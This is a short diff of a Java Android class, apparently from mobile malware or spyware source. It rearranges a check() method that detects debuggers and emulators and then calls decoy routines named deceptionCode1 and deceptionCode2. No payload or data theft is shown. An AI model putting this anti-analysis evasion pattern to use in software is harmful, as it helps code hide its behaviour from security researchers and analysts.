@@ -833,12 +833,13 @@ public class Core extends Activity implements Runnable {
 
 	public boolean check() {
 		if (!Cfg.DEBUG) {
-			AntiDebug ad = new AntiDebug();
-			if (ad.isDebug()) {
-				deceptionCode1();
-				return false;
-			}
-
+            AntiDebug ad = new AntiDebug();
+            if (ad.isDebug()) {
+                deceptionCode1();
+                return false;
+            }
+        }
+        if (!Cfg.DEBUG || Cfg.DEBUGANTIEMU) {
 			AntiEmulator am = new AntiEmulator();
 			if (am.isEmu()) {
 				deceptionCode2();
